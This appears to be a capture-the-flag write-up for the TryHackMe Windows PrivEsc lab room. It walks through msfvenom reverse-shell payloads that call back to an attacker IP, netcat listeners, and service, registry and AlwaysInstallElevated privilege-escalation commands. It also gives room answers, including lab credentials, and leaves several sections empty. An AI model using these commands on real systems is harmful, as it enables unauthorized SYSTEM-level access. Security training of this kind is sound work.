![Windows PrivEsc Banner](https://i.imgur.com/2dmv1BY.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Windows_Priv_Esc_Cover.png" alt="Windows PrivEsc Logo">
</p>

# Windows PrivEsc

This guide contains the answer and steps necessary to get to them for the [Windows PrivEsc](https://tryhackme.com/room/windows10privesc) room.

## Table of contents

- [Generate a Reverse Shell Executable](#generate-a-reverse-shell-executable)
- [Service Exploits - Insecure Service Permissions](#service-exploits---insecure-service-permissions)
- [Service Exploits - Unquoted Service Path](#service-exploits---unquoted-service-path)
- [Service Exploits - Weak Registry Permissions](#service-exploits---weak-registry-permissions)
- [Service Exploits - Insecure Service Executables](#service-exploits---insecure-service-executables)
- [Registry - AutoRuns](#registry---autoruns)
- [Registry - AlwaysInstallElevated](#registry---alwaysinstallelevated)
- [Passwords - Registry](#passwords---registry)
- [Passwords - Saved Creds](#passwords---saved-creds)
- [Passwords - Security Account Manager (SAM)](#passwords---security-account-manager-sam)
- [Passwords - Passing the Hash](#passwords---passing-the-hash)
- [Scheduled Tasks](#scheduled-tasks)
- [Insecure GUI Apps](#insecure-gui-apps)
- [Startup Apps](#startup-apps)
- [Token Impersonation - Rogue Potato](#token-impersonation---rogue-potato)
- [Token Impersonation - PrintSpoofer](#token-impersonation---printspoofer)
- [Privilege Escalation Scripts](#privilege-escalation-scripts)

### Deploy a Vulnerable Windows VM

**Username:** user

**Password:** password321

We can connection to the machine with various tools. I use Reminna in these examples, but you can also use xfreerdp.

![Reminna Remote Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Deploy_Remina_RDP.png)

```cmd
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.145.241
```

### Generate a Reverse Shell Executable

*Generate a reverse shell executable and transfer it to the Windows VM. Check that it works!*

First we will create a reverse shell executabel using msfvenom. We specifiy the attack machine ip and port and the file extension and name.

```cmd
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.78.136 LPORT=1337 -f exe -o reverse.exe
```

![Msf Venom Payload](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Reverse_Shell_Msfvenom_Payload.png)

Now we must transfer this file over to our target machine. We can use an SMB server in this room. **Don't forget the dot at the end.**

```cmd
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

![SMB Server](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Reverse_Shell_SMB_Server.png)

Now we can copy over the file from our machine.

```cmd
copy \\10.18.78.136\kali\reverse.exe "C:\PrivEsc\reverse.exe"
```

![Copy Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Reverse_Shell_Copy_Shell.png)

Then we set up a listener on our machine using Netcat.

```cmd
nc -nlvp 1337
```

Finally we can execute the reverse shell from our target machine.

![Netcat Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Reverse_Shell_Nc_Connection.png)

### Service Exploits - Insecure Service Permissions

Now we are utilizing insecure service permissions to execute our reverse shell.

1. What is the original BINARY_PATH_NAME of the daclsvc service?

   First we check the permissions that are set for the `daclsvc` service.
   
   ```cmd
   <Path to>\accesschk.exe /accepteula -uwcqv user daclsvc
   ```
   
   ![Service Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Exploits_Permissions_Priveleges.png)
   
   It looks like we as `user` have permission to change the service configuration. Querying this service we see it runs as SYSTEM. The next image also contains the answer to our question.
   
   ```cmd
   sc qc daclsvc
   ```
   
   ![Service Configuration](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Exploits_Permissions_Service_Configuration.png)
   
   Next we modify the service executable path to reflect our reverse shell.
   
   ```cmd
   sc config daclsvc binpath= "\"<Path to>\reverse.exe\""
   ```
   
   ![Change Configuration](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Exploits_Permissions_Chang_Bin_Path.png)
   
   Then we set up a listener on our machine using Netcat.

   ```cmd
   nc -nlvp 1337
   ```
   
   Lastly we start the service.
   
   ```cmd
   net start daclsvc
   ```

   ![Elevated Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Exploits_Permissions_Elevated_Shell.png)   
   
   ><details><summary>Click for answer</summary>C:\Program Files\DACL Service\daclservice.exe</details>

### Service Exploits - Unquoted Service Path

In this task we will use the unquotedsvc service to get our reverse shell.

1. What is the BINARY_PATH_NAME of the unquotedsvc service?

   We first query the service configuration to see if it runs as SYSTEM.
   
   ```cmd
   sc qc unquotedsvc
   ```
   
   ![Service Configuration](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Unquoted_Service_Path_Service_Configuration.png)
   
   Then we look for the available permissions for the folder it is located in.
   
   ```cmd
   <Path to>\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\" 
   ```
   
   ![Path Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Unquoted_Service_Path_Permissions.png)
   
   Then we copy the reverse shell into this folder.
   
   ```cmd
   copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
   ```
   
   ![Copy Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Unquoted_Service_Path_Copy_Shell.png)
   
   We must now set up a listerner on our machine.
   
   ```cmd
   nc -nlvp 1337
   ```
   
   Lastly, we can start the service.
   
   ```cmd
   net start unquotedsvc
   ```
   
   ![Reverse Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/unquoted_Service_Path_Nc_Connection.png)

   ><details><summary>Click for answer</summary>C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe</details>

### Service Exploits - Weak Registry Permissions

In this task we will exploit a weak registry permission to execute our reverse shell.

*Read and follow along with the above.*

We first query the service configuration for the `regsvc` service.

```cmd
sc qc regsvc
```

![Service Configuration](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Weak_Registry_Service_Configuration.png)

Then we check for any write permissions we may have.

```cmd
C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

![Access Check](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Weak_Registry_Access_Check.png)

Looks like the service runs as SYSTEM and we have write access the the registry entries. Lets change them to run our reverse shell.

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```

![Registry Modification](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Weak_Registry_Modification.png)

Then we can start a listener on our machine.

```cmd
nc -nlvp 1337
```

And lastly we run the service to esecute our reverse shell.

```cmd
net start regsvc
```

![Reverse Shell Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Weak_Registry_Reverse_Connection.png)

### Service Exploits - Insecure Service Executables

In this task we will utilize insecure executables to run our reverse shell.

*Read and follow along with the above.*

First we query the service configuration again to see what the service runs as.

```cmd
sc qc filepermsvc
```

![Service Configuration](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Insecure_Executable_Service_Configuration.png)

Then we check for the write permissions we have on the binary.

```cmd
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```

![Access Check](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Insecure_Executable_Access_Check.png)

Now we must copy over our reverse shell to replace the legit executable.

```cmd
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
```

![Copy Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Insecure_Executable_Copy_Shell.png)

Now we set up a listener and start the service.

```cmd
nc -nlvp 1337
```

```cmd
net start filepermsvc
```

![Remote Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Insecure_Executable_Nc_Connection.png)

### Registry - AutoRuns

In this task we will exploit the AutoRun service to run our reverse shell.

*Read and follow along with the above.*

We first query the registry keys to find the correct executable.

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

![Registry Configuration](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Auto_Runs_Registry_Configuration.png)

Next we can look for the permisstions we have on that executable.

```cmd
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```

![Access Check](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Auto_Runs_Access_Check.png)

Since we have write access, we can copy the shell over into this folder.

```cmd
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
```

![Copy Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Auto_Runs_Copy_Shell.png)

We now set up a listener and wait for the reverse shell to execute. For this we need to restart (not terminate) the VM and log into it via RDP once more.

```cmd
nc -nlvp 1337
```

![Reverse Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Auto_Runs_Restart_Connection.png)

### Registry - AlwaysInstallElevated

In this task we will utilize the fact that sometimes, programs will get installed using an elevated installer.

*Read and follow along with the above.*

As before, we first query the registry related to this exploit to see if it is enabled (denoted by a 1).

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

![Query Register](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Always_Install_Elevated_Query_Register.png)

Now we must create a payload for us to send to the machine, which we can install to create a reverse shell with elevated priveleges. This we do with MSF Venom. This time, we make an msi file. Again, we must specify a port and our own ip address.

```cmd
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.78.136 LPORT=1337 -f msi -o reverse.msi
```

![Reverse Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Always_Install_Elevated_Reverse_Shell.png)

Next, we can us the smb server from before to transfer our file to the machine. Or we can set up a new one.

On our machine:

```cmd
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

On the target machine:

```cmd
copy \\10.18.78.136\kali\reverse.msi "C:\PrivEsc\reverse.ms
```

![Copy File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Always_Install_Elevated_Copy_File.png)

The last step is to setup a listener on the specified port.

```cmd
nc -nlvp 1337
```

Al that is left to do now, is to execute the installer and wait for the connection to be made.

```cmd
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

![Reverse Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Always_Install_Elevated_Reverse_Connection.png)


### Passwords - Registry

In this task we will search the registry for any keys related to credentials. Unfortunately, as stated in the description, the password was not saved in the registry for me. So I had to use the supplied hint. However, I did perform all necessary steps that would have otherwise granted me the password.

1. What was the admin password you found in the registry?

   To search the registry for a specific keyword, we can use the following command:
   
   ```cmd
   reg query /f password  /t REG_SZ
   ```
   
   ![Search Registry](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Registry_Search_Registry.png)
   
   Since I couldn't find anything, I used the specific search string to directly query the necessary entry.
   
   ```cmd
   reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
   ```
   
   ![Query Registry](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Registry_Query_Register.png)
   
   Unfortunately, I couldn't find the password here. So I used the supplied hint to create a connection to the target machine from our machine.
   
   ```cmd
   winexe -U 'admin%password123' //10.10.6.194 cmd.exe
   ```
   
   ![Remote Shell Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Registry_Remote_Shell.png)   

   ><details><summary>Click for answer</summary>password123</details>

### Passwords - Saved Creds

In this task we will exploit the fact that credentials are saved on the machine itself.

*Read and follow along with the above.*

For this question we will use `cmdkey` to get more info on the stored credentials. To list all stored credentials we can use:

```cmd
cmdkey /list
```

![Saved Credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Saved_Creds_Credentials.png)

Now we can run the reverse as we did before. However, this time it will be executed running as a user with elevated priveleges.

```cmd
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

![Elevated Reverse Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Saved_Creds_Reverse_Connection.png)

### Passwords - Security Account Manager (SAM)



1. What is the NTLM hash of the admin user?
   
   

   ><details><summary>Click for answer</summary></details>

### Passwords - Passing the Hash



Read and follow along with the above. 

### Scheduled Tasks



Read and follow along with the above. 

### Insecure GUI Apps



Read and follow along with the above. 

### Startup Apps



Read and follow along with the above. 

### Token Impersonation - Rogue Potato



1. Name one user privilege that allows this exploit to work.



   ><details><summary>Click for answer</summary></details>

2. Name the other user privilege that allows this exploit to work.

   

   ><details><summary>Click for answer</summary></details>

### Token Impersonation - PrintSpoofer



Read and follow along with the above.

### Privilege Escalation Scripts



xperiment with all four tools, running them with different options. Do all of them identify the techniques used in this room? 
